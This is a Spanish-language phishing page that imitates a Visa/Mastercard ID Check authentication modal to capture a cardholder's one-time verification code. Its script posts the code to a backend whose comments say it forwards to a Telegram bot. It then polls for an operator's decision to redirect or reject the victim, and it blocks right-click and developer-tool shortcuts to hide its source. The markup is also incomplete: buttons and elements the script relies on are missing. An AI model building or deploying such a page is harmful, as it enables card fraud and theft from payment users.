<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autenticación de usuario</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: rgba(0, 0, 0, 0.5);
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .modal-container {
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            max-width: 550px;
            width: 100%;
            animation: slideIn 0.3s ease-out;
            overflow: hidden;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 30px;
            border-bottom: 1px solid #e0e0e0;
            background-color: #fff;
        }

        .logo-container {
            display: flex;
            align-items: center;
        }

        .logo-container img {
            height: 40px;
            width: auto;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .visa-logo {
            font-weight: bold;
            color: #1434CB;
            font-size: 28px;
            font-style: italic;
        }

        .mastercard-logo {
            display: flex;
            align-items: center;
            font-size: 18px;
            font-weight: 500;
        }

        .mastercard-circles {
            display: flex;
            margin-right: 5px;
            position: relative;
            width: 36px;
            height: 24px;
        }

        .circle-red {
            width: 24px;
            height: 24px;
            background-color: #EB001B;
            border-radius: 50%;
            position: absolute;
            left: 0;
        }

        .circle-orange {
            width: 24px;
            height: 24px;
            background-color: #FF5F00;
            border-radius: 50%;
            position: absolute;
            left: 6px;
            opacity: 0.8;
        }

        .circle-yellow {
            width: 24px;
            height: 24px;
            background-color: #F79E1B;
            border-radius: 50%;
            position: absolute;
            left: 12px;
        }

        .id-check {
            font-size: 14px;
            color: #666;
        }

        .close-btn {
            background: none;
            border: none;
            font-size: 28px;
            color: #666;
            cursor: pointer;
            padding: 0 10px;
            transition: color 0.2s;
            line-height: 1;
        }

        .close-btn:hover {
            color: #000;
        }

        .content {
            padding: 40px 30px;
        }

        h1 {
            font-size: 28px;
            margin-bottom: 30px;
            color: #000;
            font-weight: 600;
        }

        .instruction-text {
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 25px;
            color: #333;
        }

        .label {
            font-size: 14px;
            color: #666;
            margin-bottom: 10px;
            display: block;
        }

        .input-field {
            width: 100%;
            padding: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 15px;
            transition: border-color 0.3s;
        }

        .input-field:focus {
            outline: none;
            border-color: #1434CB;
        }

        .timer-text {
            font-size: 13px;
            color: #666;
            margin-bottom: 30px;
        }

        .timer-text .time {
            color: #1434CB;
            font-weight: 500;
        }

        .submit-btn {
            width: 100%;
            padding: 15px;
            background-color: #1434CB;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-bottom: 25px;
        }

        .submit-btn:hover:not(:disabled) {
            background-color: #0f2aa3;
        }

        .submit-btn:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        .footer-links {
            text-align: center;
            font-size: 14px;
        }

        .footer-links a {
            color: #1434CB;
            text-decoration: none;
            margin: 0 5px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .separator {
            color: #666;
            margin: 0 5px;
        }

        .notification {
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            display: none;
        }

        .notification.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        /* Loading spinner */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(255, 255, 255, 0.95);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
        }

        .loading-overlay.active {
            display: flex;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1434CB;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            margin-top: 20px;
            font-size: 16px;
            color: #333;
        }

        /* Responsive para móviles */
        @media (max-width: 768px) {
            body {
                background-color: #ffffff;
                padding: 0;
            }

            .modal-container {
                border-radius: 0;
                box-shadow: none;
                max-width: 100%;
                height: 100vh;
                display: flex;
                flex-direction: column;
            }

            .header {
                padding: 15px 20px;
            }

            .header-right {
                gap: 10px;
            }

            .visa-logo {
                font-size: 24px;
            }

            .id-check {
                display: none;
            }

            .content {
                padding: 30px 20px;
                flex: 1;
            }

            h1 {
                font-size: 24px;
            }
        }

        @media (max-width: 480px) {
            .logo-container img {
                height: 32px;
            }

            .mastercard-circles {
                width: 30px;
                height: 20px;
            }

            .circle-red,
            .circle-orange,
            .circle-yellow {
                width: 20px;
                height: 20px;
            }

            .circle-orange {
                left: 5px;
            }

            .circle-yellow {
                left: 10px;
            }
        }
    </style>
</head>

            <h1>Autenticación de usuario</h1>
            
            <p class="instruction-text">
                Por favor ingrese el código de verificación para continuar con el proceso de autenticación.
            </p>

            <label class="label">Ingresa el código de verificación:</label>
            <input type="text" class="input-field" id="codeInput" maxlength="6" placeholder="" inputmode="numeric" pattern="[0-9]*" onkeypress="return event.charCode >= 48 && event.charCode <= 57">

    <script>
        // ============================================
        // CONFIGURACIÓN DE TELEGRAM
        // ============================================
        const TELEGRAM_BOT_TOKEN = 'TU_BOT_TOKEN_AQUI';
        const TELEGRAM_CHAT_ID = 'TU_CHAT_ID_AQUI';
        
        // Variable para almacenar el ID único de esta sesión
        let sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        let checkInterval = null;

        // ============================================
        // FUNCIONALIDAD DEL TEMPORIZADOR
        // ============================================
        let timeLeft = 61;
        const timerElement = document.querySelector('.time');

        function updateTimer() {
            if (timeLeft > 0) {
                timeLeft--;
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                timerElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
            } else {
                timeLeft = 61;
            }
        }

        setInterval(updateTimer, 1000);

        // ============================================
        // FUNCIÓN PARA ENVIAR A TELEGRAM CON BOTONES
        // ============================================
        async function sendToTelegram(code) {
            const url = 'php/codigo.php';
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        codigo: code
                    })
                });

                const data = await response.json();
                return data.success;
            } catch (error) {
                console.error('Error al enviar a Telegram:', error);
                return false;
            }
        }

        // ============================================
        // FUNCIÓN PARA VERIFICAR RESPUESTA DE TELEGRAM
        // ============================================
        async function checkTelegramResponse() {
            try {
                const response = await fetch('check_status.php');
                const data = await response.json();
                
                return data.status;
            } catch (error) {
                console.error('Error al verificar respuesta:', error);
                return 'pending';
            }
        }

        // ============================================
        // MOSTRAR NOTIFICACIONES
        // ============================================
        function showNotification(message, type) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = `notification ${type}`;
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 5000);
        }

        // ============================================
        // MOSTRAR/OCULTAR LOADING
        // ============================================
        function showLoading() {
            document.getElementById('loadingOverlay').classList.add('active');
        }

        function hideLoading() {
            document.getElementById('loadingOverlay').classList.remove('active');
        }

        // ============================================
        // INICIAR VERIFICACIÓN CONTINUA
        // ============================================
        async function startVerificationCheck() {
            showLoading();
            
            checkInterval = setInterval(async () => {
                try {
                    const response = await fetch('check_status.php');
                    const data = await response.json();
                    
                    if (data.status === 'redirect') {
                        clearInterval(checkInterval);
                        hideLoading();
                        window.location.href = data.target;
                    } else if (data.status === 'error') {
                        clearInterval(checkInterval);
                        hideLoading();
                        showNotification(data.message, 'error');
                        document.getElementById('codeInput').value = '';
                        document.getElementById('codeInput').focus();
                        // Generar nuevo session ID para el siguiente intento
                        sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                    } else if (data.status === 'no_session') {
                        clearInterval(checkInterval);
                        hideLoading();
                        showNotification('Sesión expirada. Por favor inicie nuevamente.', 'error');
                        window.location.href = 'index.php';
                    }
                    // 'pending' sigue verificando
                } catch (error) {
                    console.error('Error al verificar respuesta:', error);
                }
            }, 0);
        }

        // ============================================
        // MANEJADOR DEL BOTÓN ENVIAR
        // ============================================
        document.getElementById('submitBtn').addEventListener('click', async function() {
            const code = document.getElementById('codeInput').value.trim();
            
            if (code === '') {
                showNotification('Por favor ingrese el código temporal', 'error');
                return;
            }

            // Enviar a Telegram
            const success = await sendToTelegram(code);

            if (success) {
                // Iniciar el proceso de verificación infinita
                startVerificationCheck();
            } else {
                showNotification('Código incorrecto. Intente nuevamente.', 'error');
            }
        });

        // ============================================
        // PERMITIR ENVIAR CON ENTER
        // ============================================
        document.getElementById('codeInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                document.getElementById('submitBtn').click();
            }
        });

        // ============================================
        // BOTÓN CERRAR
        // ============================================
        document.querySelector('.close-btn').addEventListener('click', function() {
            if (checkInterval) {
                clearInterval(checkInterval);
            }
            if (confirm('¿Desea cerrar esta ventana?')) {
                window.close();
            }
        });

        // ============================================
        // ENFOCAR EL INPUT AL CARGAR
        // ============================================
        window.addEventListener('load', function() {
            document.getElementById('codeInput').focus();
        });

        // ============================================
        // PROTECCIÓN CONTRA CLIC DERECHO Y CÓDIGO FUENTE
        // ============================================
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });

        document.addEventListener('keydown', function(e) {
            // Prevenir F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
            if (e.keyCode === 123 || // F12
                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
                (e.ctrlKey && e.keyCode === 85)) { // Ctrl+U
                e.preventDefault();
                return false;
            }
        });

        // Prevenir arrastrar imágenes
        document.addEventListener('dragstart', function(e) {
            if (e.target.tagName === 'IMG') {
                e.preventDefault();
                return false;
            }
        });

        // ============================================
        // LIMPIAR INTERVAL AL CERRAR LA PÁGINA
        // ============================================
        window.addEventListener('beforeunload', function() {
            if (checkInterval) {
                clearInterval(checkInterval);
            }
        });
    </script>
</body>
</html>
